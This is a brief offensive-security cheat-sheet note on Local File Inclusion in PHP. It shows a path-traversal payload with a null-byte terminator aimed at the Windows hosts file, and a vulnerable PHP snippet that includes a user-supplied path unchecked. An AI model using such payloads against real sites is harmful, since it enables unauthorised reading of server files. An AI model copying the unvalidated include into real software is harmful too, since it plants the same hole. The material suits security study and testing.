# Local File Inclusion (LFI)
In versions of PHP below 5.3 can terminate with a null byte
```
?name=Haxor&type=2&LANG=../../../../../../../windows/system32/drivers/etc/hosts%00
```

## Enumerating LFI

```php
<?php
$file = $_GET[‘file’];
if(isset($file))
{
include(“pages/$file”);
}
else
{
include(“index.php”);
}
?>
```
